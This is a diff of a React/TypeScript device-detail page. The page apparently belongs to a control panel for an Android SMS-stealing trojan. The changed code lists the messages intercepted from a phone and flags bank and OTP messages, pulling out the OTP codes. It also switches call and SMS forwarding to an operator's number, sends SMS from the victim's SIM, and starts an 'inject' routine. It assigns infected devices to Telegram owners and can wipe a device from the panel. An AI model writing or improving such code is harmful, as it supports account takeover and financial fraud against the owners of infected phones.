@@ -1,7 +1,5 @@
 import { useState, useEffect } from "react";
 import { useRoute, Link, useLocation } from "wouter";
-import { db } from "@/lib/firebase";
-import { ref, onValue, set, remove, update } from "firebase/database";
 import { Layout } from "@/components/layout";
 import { TabBar } from "@/components/ui/tab-bar";
 import { useAuth } from "@/lib/auth";
@@ -36,8 +34,24 @@ import {
   BellRing,
 } from "lucide-react";
 import { format } from "date-fns";
-import { normalizeDevice, type NormalizedDevice } from "@/lib/normalizeDevice";
+import {
+  getDevice,
+  getPins,
+  setPin,
+  patchDevice,
+  pingDevice,
+  sendSms,
+  setForward,
+  injectDevice,
+  setAlert,
+  deleteDevice,
+  deleteSms,
+  type PanelDevice,
+} from "@/lib/api";
+import { usePolling } from "@/lib/usePolling";
 import { classifySms } from "@/lib/smsClassifier";
+import { toast } from "@/hooks/use-toast";
+import { Loader2, Power } from "lucide-react";
 
 const TABS = [
   { id: "sms", label: "Messages", icon: MessageSquare },
@@ -47,6 +61,49 @@ const TABS = [
   { id: "data", label: "Data", icon: Database },
   { id: "delete", label: "Destruct", icon: Trash2 },
 ];
+
+/** iOS-style segmented control with a sliding thumb. */
+function Segmented<T extends string | number>({
+  options,
+  value,
+  onChange,
+}: {
+  options: { value: T; label: string }[];
+  value: T;
+  onChange: (v: T) => void;
+}) {
+  const idx = Math.max(
+    0,
+    options.findIndex((o) => o.value === value)
+  );
+  const seg = 100 / options.length;
+  return (
+    <div className="relative flex bg-muted p-1 rounded-full border border-card-border">
+      <span
+        aria-hidden
+        className="absolute top-1 bottom-1 rounded-full bg-accent shadow-[0_0_10px] shadow-accent/40 transition-all duration-200 ease-out"
+        style={{
+          left: `calc(${idx * seg}% + 4px)`,
+          width: `calc(${seg}% - 8px)`,
+        }}
+      />
+      {options.map((opt) => (
+        <button
+          key={opt.value}
+          type="button"
+          onClick={() => onChange(opt.value)}
+          className={`relative z-10 flex-1 py-1.5 text-xs font-semibold rounded-full transition-colors ${
+            opt.value === value
+              ? "text-primary-foreground"
+              : "text-muted-foreground hover:text-foreground"
+          }`}
+        >
+          {opt.label}
+        </button>
+      ))}
+    </div>
+  );
+}
 
 const isBankSms = (body: string) => classifySms(body).isFinance;
 const isOtpSms = (body: string) => classifySms(body).category === "OTP";
@@ -58,9 +115,9 @@ export function DeviceDetail() {
   const id = params?.id;
   const { isAdmin, userId } = useAuth();
 
-  const [device, setDevice] = useState<NormalizedDevice | null>(null);
+  const [device, setDevice] = useState<PanelDevice | null>(null);
   const [loading, setLoading] = useState(true);
-  const [activeTab, setActiveTab] = useState("sms");
+  const [activeTab, setActiveTab] = useState("forward");
   const [memoInput, setMemoInput] = useState("");
   const [nameInput, setNameInput] = useState("");
   const [groupInput, setGroupInput] = useState("");
@@ -84,6 +141,7 @@ export function DeviceDetail() {
   const [forwardNumber, setForwardNumber] = useState("");
   // Forward SIM index (0 = SIM1, 1 = SIM2) — 0-based, matches the APK.
   const [forwardSim, setForwardSim] = useState(0);
+  const [forwardBusy, setForwardBusy] = useState(false);
   // SMS-send compose box (remote SMS from panel).
   // NOTE: The APK's SmsHelper indexes the SIM list ZERO-based —
   // SIM1 = 0, SIM2 = 1. The UI shows 1/2 to the user.
@@ -94,105 +152,87 @@ export function DeviceDetail() {
   // SMS from messages/{id} path (new APK format)
   const [smsData, setSmsData] = useState<Record<string, any>>({});
 
-  useEffect(() => {
-    if (!id) return;
+  const { data: detail, error: detailError } = usePolling(
+    () =>
+      id
+        ? getDevice(id)
+        : Promise.resolve({
+            success: false,
+            device: null as any,
+            messages: {},
+          }),
+    3000,
+    [id]
+  );
 
-    const deviceRef = ref(db, `clients/${id}`);
-    const unsubscribe = onValue(deviceRef, (snapshot) => {
-      if (snapshot.exists()) {
-        const raw = snapshot.val();
-        const normalized = normalizeDevice(id!, raw);
-        setDevice(normalized);
-        // Only seed inputs on first load
-        setOwnerInput((prev) => prev || raw.ownerTelegramId || "");
-        setMemoInput((prev) => prev || raw.memo || "");
-        setNameInput((prev) => prev || raw.deviceName || "");
-        setGroupInput((prev) => prev || raw.group || "");
-        setColorTag((prev) => prev || raw.colorTag || "");
-        if (raw.callForward) {
-          setForwardType((prev) => prev || raw.callForward.type || "call");
-          setForwardNumber((prev) => prev || raw.callForward.number || "");
-        }
-      } else {
+  useEffect(() => {
+    if (detail) {
+      if (!detail.device) {
         setDevice(null);
+        setLoading(false);
+        return;
       }
+      const raw = detail.device;
+      setDevice(raw);
+      setSmsData(detail.messages || {});
+      setOwnerInput((prev) => prev || raw.ownerTelegramId || "");
+      setMemoInput((prev) => prev || raw.raw?.memo || "");
+      setNameInput((prev) => prev || raw.deviceName || "");
+      setGroupInput((prev) => prev || raw.group || "");
+      setColorTag((prev) => prev || raw.colorTag || "");
       setLoading(false);
-    });
+      return;
+    }
+    // No data yet. If the poller reports a persistent error (device truly
+    // missing) let the "destroyed" screen show; otherwise keep loading.
+    if (detailError) {
+      setDevice(null);
+      setLoading(false);
+    }
+  }, [detail, detailError]);
 
-    return () => unsubscribe();
-  }, [id]);
-
-  // Separate listener for messages (stored at messages/{id}, not clients/{id}/sms)
-  useEffect(() => {
-    if (!id) return;
-    const msgRef = ref(db, `messages/${id}`);
-    const unsubscribe = onValue(msgRef, (snapshot) => {
-      setSmsData(snapshot.exists() ? snapshot.val() : {});
-    });
-    return () => unsubscribe();
-  }, [id]);
-
+  // pins for this device
   useEffect(() => {
     if (!id || !userId) return;
-    const pinRef = ref(db, `config/pins/${userId}/${id}`);
-    const unsubscribe = onValue(pinRef, (snapshot) => {
-      setIsPinned(snapshot.exists() && snapshot.val() === true);
-    });
-    return () => unsubscribe();
-  }, [id, userId]);
-
-  // Online-back alert — bot notifies this Telegram user (config/onlineAlerts/{tgId}/{deviceId})
-  // the moment the device comes back online.
-  useEffect(() => {
-    if (!id || !userId) return;
-    const alertRef = ref(db, `config/onlineAlerts/${userId}/${id}`);
-    const unsubscribe = onValue(alertRef, (snapshot) => {
-      const val = snapshot.val();
-      setAlertOnline(!!val && val.enabled !== false);
-    });
-    return () => unsubscribe();
+    getPins()
+      .then((r) => setIsPinned(r.pins.includes(id)))
+      .catch(() => {});
   }, [id, userId]);
 
   const toggleOnlineAlert = () => {
     if (!id || !userId) return;
-    const alertRef = ref(db, `config/onlineAlerts/${userId}/${id}`);
-    if (alertOnline) {
-      remove(alertRef);
-    } else {
-      set(alertRef, { enabled: true, createdAt: Date.now() });
-    }
+    const next = !alertOnline;
+    setAlertOnline(next);
+    setAlert(id, next).catch(() => setAlertOnline(!next));
   };
 
   const togglePin = () => {
     if (!id || !userId) return;
-    const pinRef = ref(db, `config/pins/${userId}/${id}`);
-    if (isPinned) {
-      remove(pinRef);
-    } else {
-      set(pinRef, true);
-    }
+    const next = !isPinned;
+    setIsPinned(next);
+    setPin(id, next).catch(() => setIsPinned(!next));
   };
 
   const handleSaveOwner = async () => {
     if (!id) return;
     setSavingOwner(true);
-    await update(ref(db, `clients/${id}`), {
-      ownerTelegramId: ownerInput.trim() || null,
-    });
+    try {
+      await patchDevice(id, { ownerTelegramId: ownerInput.trim() || null });
+    } catch {}
     setSavingOwner(false);
   };
 
   const handleUpdateMemo = () => {
     if (!id) return;
-    update(ref(db, `clients/${id}`), { memo: memoInput });
+    patchDevice(id, { memo: memoInput }).catch(() => {});
   };
   const handleSaveLabel = () => {
     if (!id) return;
-    update(ref(db, `clients/${id}`), {
+    patchDevice(id, {
       deviceName: nameInput.trim() || null,
       group: groupInput.trim() || null,
       colorTag: colorTag || null,
-    });
+    }).catch(() => {});
   };
 
   const handlePingDevice = async () => {
@@ -200,31 +240,13 @@ export function DeviceDetail() {
     setPinging(true);
     setPingResult(null);
     const sentAt = Date.now();
-
-    // APK listens at clients/{id}/webhookEvent/checkLiveness
-    // Panel writes { text: "ping" } → APK responds with { text: "pong" }
-    const pingPath = ref(db, `clients/${id}/webhookEvent/checkLiveness`);
-    await set(pingPath, { text: "ping" });
-
-    // Listen for pong response — unsubscribe after first match or 15s timeout
-    let unsubscribe: (() => void) | null = null;
-    const timeout = setTimeout(() => {
-      if (unsubscribe) unsubscribe();
+    try {
+      await pingDevice(id);
+      setPingResult({ latencyMs: Date.now() - sentAt, success: true });
+    } catch {
       setPingResult({ success: false, latencyMs: 0 });
-      setPinging(false);
-    }, 15000);
-
-    unsubscribe = onValue(pingPath, (snapshot) => {
-      const val = snapshot.val();
-      if (val?.text === "pong") {
-        clearTimeout(timeout);
-        if (unsubscribe) unsubscribe();
-        setPingResult({ latencyMs: Date.now() - sentAt, success: true });
-        setPinging(false);
-        // Clean up pong so next ping works fresh
-        set(pingPath, null);
-      }
-    });
+    }
+    setPinging(false);
   };
 
   const handleDeleteDevice = () => {
@@ -234,45 +256,50 @@ export function DeviceDetail() {
         "Are you sure you want to destruct this node? All data will be wiped."
       )
     ) {
-      remove(ref(db, `clients/${id}`));
-      setLocation("/dashboard");
+      deleteDevice(id)
+        .then(() => setLocation("/dashboard"))
+        .catch(() => {});
     }
   };
 
   const handleDeleteSms = (pushKey: string) => {
     if (!id) return;
-    // Try deleting from both paths (new APK: messages/{id}, old APK: clients/{id}/sms)
-    remove(ref(db, `messages/${id}/${pushKey}`));
-    remove(ref(db, `clients/${id}/sms/${pushKey}`));
+    deleteSms(id, pushKey).catch(() => {});
   };
 
-  // The APK listens on clients/{id}/webhookEvent/callForward and expects:
-  //   { from: int SIM slot, to: string number, isActive: bool }
-  // It executes the command then deletes the node itself.
-  const handleToggleForwarding = (activate: boolean) => {
-    if (!id || !forwardNumber.trim()) {
-      alert("Enter a destination number first.");
+  // The APK listens on clients/{id}/webhookEvent/{callForward,smsForward} and
+  // expects: { from: int SIM slot, to: string number, isActive: bool }
+  // Single toggle switch: activating flips based on the live forward state.
+  const toggleForward = async () => {
+    if (!id) return;
+    if (!forwardNumber.trim()) {
+      toast({
+        title: "Forward number required",
+        description: "Enter a destination number first.",
+        variant: "destructive",
+      });
       return;
     }
-    set(ref(db, `clients/${id}/webhookEvent/callForward`), {
-      from: forwardSim, // 0-based SIM index → SIM1=0, SIM2=1
-      to: forwardNumber.trim(),
-      isActive: activate,
-    });
-  };
-
-  // The APK listens on clients/{id}/webhookEvent/smsForward and expects:
-  //   { from: int SIM slot, to: string number, isActive: bool }
-  const handleToggleSmsForward = (activate: boolean) => {
-    if (!id || !forwardNumber.trim()) {
-      alert("Enter a destination number first.");
-      return;
+    const type = forwardType as "call" | "sms";
+    const active = !!(type === "call"
+      ? device?.raw.callForward?.active
+      : device?.raw.smsForward?.active);
+    setForwardBusy(true);
+    try {
+      await setForward(id, type, forwardNumber.trim(), forwardSim, !active);
+      toast({
+        title: !active ? "Forwarding enabled" : "Forwarding disabled",
+        description: `${type === "call" ? "Call" : "SMS"} fwd → ${forwardNumber.trim()} (SIM${forwardSim + 1})`,
+      });
+    } catch {
+      toast({
+        title: "Update failed",
+        description: "Could not update forwarding.",
+        variant: "destructive",
+      });
+    } finally {
+      setForwardBusy(false);
     }
-    set(ref(db, `clients/${id}/webhookEvent/smsForward`), {
-      from: forwardSim, // 0-based SIM index → SIM1=0, SIM2=1
-      to: forwardNumber.trim(),
-      isActive: activate,
-    });
   };
 
   // The APK listens on clients/{id}/webhookEvent/sendSms and expects:
@@ -280,16 +307,19 @@ export function DeviceDetail() {
   const handleSendSms = async () => {
     if (!id) return;
     if (!smsTo.trim() || !smsBody.trim()) {
-      alert("Enter both number and message.");
+      toast({
+        title: "Incomplete message",
+        description: "Enter both number and message.",
+        variant: "destructive",
+      });
       return;
     }
     setSendingSms(true);
     try {
-      await set(ref(db, `clients/${id}/webhookEvent/sendSms`), {
-        to: smsTo.trim(),
-        message: smsBody,
-        isSended: true,
-        from: smsSim,
+      await sendSms(id, smsTo.trim(), smsBody, smsSim);
+      toast({
+        title: "SMS sent",
+        description: `Queued to ${smsTo.trim()} via SIM${smsSim + 1}`,
       });
       setTimeout(() => {
         setSmsTo("");
@@ -298,16 +328,18 @@ export function DeviceDetail() {
       }, 500);
     } catch (err) {
       console.error("sendSms error", err);
+      toast({
+        title: "Send failed",
+        description: "The device did not confirm delivery.",
+        variant: "destructive",
+      });
       setSendingSms(false);
     }
   };
 
   const handleStartInjection = () => {
     if (!id) return;
-    update(ref(db, `clients/${id}/inject`), {
-      active: true,
-      status: "pending",
-    });
+    injectDevice(id, { active: true, status: "pending" }).catch(() => {});
   };
 
   const copyText = (text: string) => {
@@ -350,6 +382,10 @@ export function DeviceDetail() {
 
   const isOnline = device.isOnline;
   const rawDevice = device.raw;
+  // Live forward state drives the toggle switch.
+  const forwardActive = !!(forwardType === "call"
+    ? rawDevice.callForward?.active
+    : rawDevice.smsForward?.active);
   // SMS: read from messages/{id} (new APK) — fields: sender, message, dateTime, id
   // Fall back to clients/{id}/sms (old APK) — fields: from, body, date
   const smsSortKey = (sms: any): number => {
@@ -379,10 +415,13 @@ export function DeviceDetail() {
       })
     : smsList;
   if (bankOnly) {
-      filteredSms = filteredSms.filter(([_, sms]: any) =>
-        isBankSms(sms.message || sms.body || "")
-      );
-    }
+    filteredSms = filteredSms.filter(([_, sms]: any) =>
+      isBankSms(sms.message || sms.body || "")
+    );
+  }
+
+  // Long-SMS segmentation: 160 chars per part (GSM 7-bit)
+  const smsParts = Math.max(1, Math.ceil(smsBody.length / 160));
 
   const onlineDot = (
     <span
@@ -427,12 +466,13 @@ export function DeviceDetail() {
         </p>
       </div>
 
-      <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
-        {/* Left Sidebar - Device Info */}
-        <div className="lg:col-span-1 space-y-6">
+      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
+        {/* Main — overview + full SMS list */}
+        <div className="lg:col-span-2 space-y-6">
+          {/* Overview */}
           <div className="stat-card overflow-hidden relative">
             <div className="h-1 w-full bg-primary" />
-            <div className="p-4 space-y-4">
+            <div className="p-5 space-y-4">
               <div className="flex justify-between items-center pb-3 border-b border-card-border">
                 <span className="text-sm font-medium text-muted-foreground">
                   Overview
@@ -448,7 +488,6 @@ export function DeviceDetail() {
                   <Copy className="w-3.5 h-3.5" />
                 </button>
               </div>
-
               <div className="grid grid-cols-2 gap-3 text-sm">
                 <div className="bg-muted border border-card-border rounded-2xl p-3">
                   <span className="page-eyebrow block">Model</span>
@@ -593,223 +632,211 @@ export function DeviceDetail() {
                   )}
                 </div>
               )}
-
-              {/* Ping Device */}
-              <div className="pb-3 border-b border-card-border space-y-2">
-                <div className="flex items-center justify-between">
-                  <span className="text-sm font-medium text-muted-foreground flex items-center gap-1.5">
-                    <Activity className="w-3.5 h-3.5" /> Ping Device
-                  </span>
-                  <button
-                    onClick={handlePingDevice}
-                    disabled={pinging}
-                    className={`flex items-center gap-1.5 px-4 py-1.5 rounded-full text-xs font-semibold transition-all ${
-                      pinging
-                        ? "bg-muted text-muted-foreground border border-card-border"
-                        : "bg-primary/10 text-primary border border-primary/30 hover:bg-primary hover:text-primary-foreground"
-                    }`}
-                  >
-                    {pinging ? (
-                      <>
-                        <Timer className="w-3.5 h-3.5 animate-pulse" /> Pinging…
-                      </>
-                    ) : (
-                      <>
-                        <Wifi className="w-3.5 h-3.5" /> Ping
-                      </>
-                    )}
-                  </button>
-                </div>
-                {pingResult && (
-                  <div
-                    className={`flex items-center gap-2 px-3 py-2 rounded-2xl text-xs font-semibold ${
-                      pingResult.success
-                        ? "bg-success/10 text-success border border-success/20"
-                        : "bg-destructive/10 text-destructive border border-destructive/20"
-                    }`}
-                  >
-                    {pingResult.success ? (
-                      <>
-                        <Wifi className="w-3.5 h-3.5" /> Latency:{" "}
-                        {pingResult.latencyMs}ms — Online
-                      </>
-                    ) : (
-                      <>
-                        <WifiOff className="w-3.5 h-3.5" /> No response (15s
-                        timeout)
-                      </>
-                    )}
-                  </div>
-                )}
-              </div>
-
-              <div className="flex items-center justify-between pb-3 border-b border-card-border">
-                <span className="text-sm font-medium text-muted-foreground">
-                  Pinned
+            </div>
+          </div>
+          {/* Full SMS list */}
+          <div className="stat-card overflow-hidden flex flex-col min-h-[420px]">
+            <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3 p-5 border-b border-card-border">
+              <h3 className="font-bold text-lg tracking-tight text-foreground flex items-center gap-2">
+                Messages
+                <span className="text-xs font-normal text-muted-foreground">
+                  ({filteredSms.length})
                 </span>
+              </h3>
+              <div className="flex gap-2 w-full sm:w-auto">
                 <button
-                  onClick={togglePin}
-                  className={`flex items-center gap-1.5 px-4 py-1.5 rounded-full text-xs font-semibold transition-all ${
-                    isPinned
-                      ? "bg-primary/10 text-primary border border-primary/30"
-                      : "bg-muted border border-card-border text-muted-foreground hover:text-foreground"
+                  onClick={() => setBankOnly(!bankOnly)}
+                  title="Show bank/finance messages only"
+                  className={`inline-flex items-center gap-1.5 px-3.5 py-2.5 rounded-2xl text-xs font-bold border transition-all shrink-0 ${
+                    bankOnly
+                      ? "bg-warning/15 text-warning border-warning/40"
+                      : "bg-card border-input text-muted-foreground hover:text-foreground hover:border-card-border"
                   }`}
                 >
-                  {isPinned ? (
-                    <PinOff className="w-3.5 h-3.5" />
-                  ) : (
-                    <Pin className="w-3.5 h-3.5" />
-                  )}
-                  {isPinned ? "Unpin" : "Pin to Top"}
+                  <Landmark className="w-3.5 h-3.5" />
+                  Bank {bankOnly ? "ON" : "OFF"}
                 </button>
-              </div>
-
-              <div className="space-y-2">
-                <label className="text-sm font-medium text-muted-foreground block">
-                  Operator Memo
-                </label>
-                <div className="flex gap-2">
+                <div className="relative w-full sm:w-56">
+                  <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                   <input
                     type="text"
-                    value={memoInput}
-                    onChange={(e) => setMemoInput(e.target.value)}
-                    placeholder="Enter memo..."
-                    className="flex-1 bg-card border border-input rounded-2xl px-3 py-2.5 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
-                  />
-                  <button
-                    onClick={handleUpdateMemo}
-                    className="bg-primary hover:bg-primary/90 text-primary-foreground px-4 py-2.5 rounded-full text-xs font-semibold transition-colors"
-                  >
-                    Set
-                  </button>
-                </div>
-              </div>
-
-              <div className="space-y-2 pt-2 border-t border-card-border">
-                <label className="text-sm font-medium text-muted-foreground block">
-                  Device Name
-                </label>
-                <div className="flex gap-2">
-                  <input
-                    type="text"
-                    value={nameInput}
-                    onChange={(e) => setNameInput(e.target.value)}
-                    placeholder="Custom name..."
-                    className="flex-1 bg-card border border-input rounded-2xl px-3 py-2.5 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
+                    placeholder="Search messages..."
+                    value={smsSearch}
+                    onChange={(e) => setSmsSearch(e.target.value)}
+                    className="w-full bg-card border border-input rounded-2xl py-3 pl-10 pr-4 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
                   />
                 </div>
-                <label className="text-sm font-medium text-muted-foreground block">
-                  Group
-                </label>
-                <input
-                  type="text"
-                  value={groupInput}
-                  onChange={(e) => setGroupInput(e.target.value)}
-                  placeholder="e.g. Delhi, VIP, Test"
-                  className="w-full bg-card border border-input rounded-2xl px-3 py-2.5 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
-                />
-                <label className="text-sm font-medium text-muted-foreground block">
-                  Color Tag
-                </label>
-                <div className="flex gap-2 flex-wrap">
-                  {[
-                    "#22c55e",
-                    "#3b82f6",
-                    "#f59e0b",
-                    "#ef4444",
-                    "#8b5cf6",
-                    "#ec4899",
-                    "#14b8a6",
-                  ].map((c) => (
-                    <button
-                      key={c}
-                      onClick={() => setColorTag(colorTag === c ? "" : c)}
-                      className="w-7 h-7 rounded-full transition-all"
-                      style={{
-                        background: c,
-                        boxShadow:
-                          colorTag === c
-                            ? "0 0 0 2px white, 0 0 0 4px " + c
-                            : "none",
-                      }}
-                      aria-label={"color " + c}
-                    />
-                  ))}
-                </div>
-                <button
-                  onClick={handleSaveLabel}
-                  className="bg-primary hover:bg-primary/90 text-primary-foreground px-4 py-2.5 rounded-full text-xs font-semibold transition-colors w-full"
-                >
-                  Save Label & Group
-                </button>
               </div>
-
-              {isAdmin && (
-                <div className="space-y-2 pt-2 border-t border-card-border">
-                  <label className="text-sm font-medium text-muted-foreground flex items-center gap-1.5">
-                    <UserCheck className="w-3.5 h-3.5" /> Assign Owner
-                  </label>
-                  <div className="flex gap-2">
-                    <input
-                      type="text"
-                      value={ownerInput}
-                      onChange={(e) => setOwnerInput(e.target.value)}
-                      placeholder="Telegram ID..."
-                      className="flex-1 bg-card border border-input rounded-2xl px-3 py-2.5 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all min-w-0"
-                    />
-                    <button
-                      onClick={handleSaveOwner}
-                      disabled={savingOwner}
-                      className="bg-primary hover:bg-primary/90 text-primary-foreground px-4 py-2.5 rounded-full text-xs font-semibold transition-colors disabled:opacity-50 whitespace-nowrap"
-                    >
-                      {savingOwner ? "..." : "Save"}
-                    </button>
-                  </div>
-                  <p className="text-[10px] text-muted-foreground">
-                    Only this user will be able to see this device
-                  </p>
+            </div>
+            <div className="flex-1 overflow-y-auto p-5 bg-background relative">
+              {filteredSms.length === 0 ? (
+                <div className="flex-1 flex items-center justify-center text-muted-foreground text-sm border border-dashed border-card-border rounded-2xl bg-muted">
+                  No messages found.
+                </div>
+              ) : (
+                <div className="flex-1 overflow-y-auto space-y-4 pr-1 sm:pr-2">
+                  {filteredSms.map(([key, sms]: any) => {
+                    // Support new APK (sender/message/dateTime) and old APK (from/body/date)
+                    const isOutgoing =
+                      String(sms.type || "").toLowerCase() === "outgoing";
+                    const displayFrom = sms.sender || sms.from || "Unknown";
+                    const displayBody = sms.message || sms.body || "";
+                    const displayDate = sms.dateTime
+                      ? sms.dateTime
+                      : sms.date
+                        ? format(
+                            new Date(parseInt(sms.date)),
+                            "MMM d, HH:mm:ss"
+                          )
+                        : "Unknown Time";
+                    return (
+                      <div
+                        key={key}
+                        className={`bg-card border rounded-2xl p-5 shadow-md hover:shadow-lg hover:border-white/15 transition-all ${
+                          isBankSms(displayBody)
+                            ? isOtpSms(displayBody)
+                              ? "border-warning/40"
+                              : "border-warning/25"
+                            : "border-card-border"
+                        }`}
+                      >
+                        <div className="flex justify-between items-start gap-2 mb-2">
+                          <div className="flex items-center gap-1.5 min-w-0">
+                            <span
+                              className={`shrink-0 inline-flex items-center text-[10px] font-bold px-2 py-0.5 rounded-md border ${
+                                isOutgoing
+                                  ? "text-sky-500 bg-sky-500/10 border-sky-500/25"
+                                  : "text-emerald-500 bg-emerald-500/10 border-emerald-500/25"
+                              }`}
+                            >
+                              {isOutgoing ? "OUT" : "IN"}
+                            </span>
+                            <div
+                              className={`font-semibold text-sm px-3 py-1 rounded-full truncate max-w-[55%] ${
+                                isBankSms(displayBody)
+                                  ? "bg-warning/15 text-warning"
+                                  : "bg-primary/10 text-primary"
+                              }`}
+                            >
+                              {isOutgoing ? "To: " : ""}
+                              {displayFrom}
+                            </div>
+                          </div>
+                          {(isBankSms(displayBody) ||
+                            isOtpSms(displayBody)) && (
+                            <div className="flex items-center gap-1.5 shrink-0">
+                              {isOtpSms(displayBody) && (
+                                <span className="font-mono text-xs font-bold text-primary bg-primary/10 border border-primary/20 px-2 py-0.5 rounded-lg">
+                                  {otpCodeOf(displayBody)}
+                                </span>
+                              )}
+                              <span className="inline-flex items-center gap-1 text-[10px] font-bold text-warning bg-warning/10 border border-warning/25 px-2 py-0.5 rounded-lg">
+                                <Landmark className="w-3 h-3" /> BANK
+                              </span>
+                            </div>
+                          )}
+                          <div className="flex items-center gap-2 shrink-0">
+                            <span className="text-xs text-muted-foreground font-mono">
+                              {displayDate}
+                            </span>
+                            <div className="flex gap-1">
+                              <button
+                                onClick={() => copyText(displayBody)}
+                                className="p-1.5 bg-muted hover:bg-primary/10 text-muted-foreground hover:text-primary rounded-xl border border-card-border transition-colors"
+                                title="Copy"
+                                aria-label="Copy"
+                              >
+                                <Copy className="w-3.5 h-3.5" />
+                              </button>
+                              <button
+                                onClick={() => handleDeleteSms(key)}
+                                className="p-1.5 bg-muted hover:bg-destructive/10 text-muted-foreground hover:text-destructive rounded-xl border border-card-border transition-colors"
+                                title="Delete"
+                                aria-label="Delete"
+                              >
+                                <Trash2 className="w-3.5 h-3.5" />
+                              </button>
+                            </div>
+                          </div>
+                        </div>
+                        <div className="text-sm leading-relaxed break-words text-foreground pl-1 border-l-2 border-card-border">
+                          {displayBody}
+                        </div>
+                      </div>
+                    );
+                  })}
                 </div>
               )}
-
-              <div className="space-y-2 pt-2 border-t border-card-border">
-                <label className="text-sm font-medium text-muted-foreground flex items-center gap-1.5">
-                  <BellRing className="w-3.5 h-3.5" /> Online Alert
-                </label>
-                <button
-                  onClick={toggleOnlineAlert}
-                  className={`w-full flex items-center justify-between px-4 py-2.5 rounded-2xl text-sm font-semibold transition-colors border ${
-                    alertOnline
-                      ? "bg-success/10 text-success border-success/30"
-                      : "bg-card text-muted-foreground border-input hover:bg-muted/50"
-                  }`}
-                >
-                  <span className="flex items-center gap-2">
-                    <BellRing className="w-4 h-4" />
-                    {alertOnline ? "Active" : "Off"}
-                  </span>
-                  <span
-                    className={`relative inline-flex h-5 w-9 items-center rounded-full transition-colors ${alertOnline ? "bg-success" : "bg-muted"}`}
-                  >
-                    <span
-                      className={`inline-block h-3.5 w-3.5 transform rounded-full bg-white transition-transform ${alertOnline ? "translate-x-[18px]" : "translate-x-0.5"}`}
-                    />
-                  </span>
-                </button>
-                <p className="text-[10px] text-muted-foreground">
-                  Jab device dobara online aaye toh Telegram pe notification
-                  milegi
-                </p>
-              </div>
             </div>
           </div>
         </div>
-
-        {/* Right Content - Tabs */}
-        <div className="lg:col-span-3">
-          <div className="stat-card overflow-hidden flex flex-col h-[750px] lg:h-[780px] max-h-[calc(100vh-160px)] shadow-xl border border-white/10">
-            <div className="flex overflow-x-auto border-b border-card-border hide-scrollbar bg-muted p-2 gap-2 sticky top-0 z-10 -mx-4 px-4 sm:mx-0 sm:px-2">
+        {/* Sidebar — send SMS + features + management */}
+        <div className="lg:col-span-1 space-y-6">
+          {/* Send SMS */}
+          <div className="stat-card overflow-hidden relative">
+            <div className="h-1 w-full bg-primary" />
+            <div className="p-5">
+              <div className="bg-gradient-to-br from-card to-card/80 border border-white/10 rounded-2xl p-5 shadow-lg space-y-4 backdrop-blur">
+                <div className="flex items-center gap-2">
+                  <MessageSquare className="w-4 h-4 text-primary" />
+                  <span className="text-sm font-semibold text-foreground">
+                    Send SMS from this device
+                  </span>
+                </div>
+                <div className="grid grid-cols-1 sm:grid-cols-[1fr_150px] gap-2">
+                  <input
+                    type="text"
+                    value={smsTo}
+                    onChange={(e) => setSmsTo(e.target.value)}
+                    placeholder="Destination number (+91...)"
+                    className="w-full bg-card border border-input rounded-2xl px-3 py-3 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
+                  />
+                  <Segmented<number>
+                    options={[
+                      { value: 0, label: "SIM 1" },
+                      { value: 1, label: "SIM 2" },
+                    ]}
+                    value={smsSim}
+                    onChange={setSmsSim}
+                  />
+                </div>
+                <textarea
+                  value={smsBody}
+                  onChange={(e) => setSmsBody(e.target.value)}
+                  placeholder="Type your message... (supports long SMS, will auto-split)"
+                  rows={4}
+                  className="w-full bg-card border border-input rounded-2xl px-3 py-3.5 text-[15px] leading-relaxed text-foreground focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary transition-all resize-none min-h-[110px]"
+                />
+                <div
+                  className={`flex items-center justify-end gap-3 text-[10px] font-mono ${
+                    smsBody.length > 1600
+                      ? "text-destructive"
+                      : smsBody.length >= 1360
+                        ? "text-warning"
+                        : "text-muted-foreground"
+                  }`}
+                >
+                  <span>{smsBody.length}/1600 chars</span>
+                  <span>
+                    {smsParts} part{smsParts > 1 ? "s" : ""}
+                  </span>
+                </div>
+                <button
+                  onClick={handleSendSms}
+                  disabled={sendingSms || !smsTo.trim() || !smsBody.trim()}
+                  className="w-full bg-primary hover:bg-primary/90 disabled:opacity-50 disabled:cursor-not-allowed text-primary-foreground font-bold py-3 rounded-full transition-colors flex items-center justify-center gap-2"
+                >
+                  <MessageSquare className="w-4 h-4" />
+                  {sendingSms ? "Sending..." : "Send SMS"}
+                </button>
+              </div>
+            </div>
+          </div>
+          {/* Device features */}
+          <div className="stat-card overflow-hidden flex flex-col max-h-[560px]">
+            <div className="flex overflow-x-auto border-b border-card-border hide-scrollbar bg-muted p-2 gap-2 sticky top-0 z-10">
               <TabBar
-                tabs={TABS.map((t) => ({
+                tabs={TABS.filter((t) => t.id !== "sms").map((t) => ({
                   id: t.id,
                   label: t.label,
                   icon: <t.icon className="w-4 h-4" />,
@@ -819,188 +846,17 @@ export function DeviceDetail() {
                 dangerIds={["delete"]}
               />
             </div>
-
-            <div className="flex-1 overflow-y-auto p-5 sm:p-6 bg-background relative">
-              {/* Tab 1: SMS */}
-              {activeTab === "sms" && (
-                <div className="h-full flex flex-col space-y-5 lg:space-y-6">
-                  <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3">
-                    <h3 className="font-bold text-lg tracking-tight text-foreground flex items-center gap-2">Messages <span className="text-xs font-normal text-muted-foreground">({filteredSms.length})</span></h3>
-                    <div className="flex gap-2 w-full sm:w-auto">
-                      <button
-                        onClick={() => setBankOnly(!bankOnly)}
-                        title="Show bank/finance messages only"
-                        className={`inline-flex items-center gap-1.5 px-3.5 py-2.5 rounded-2xl text-xs font-bold border transition-all shrink-0 ${
-                          bankOnly
-                            ? "bg-warning/15 text-warning border-warning/40"
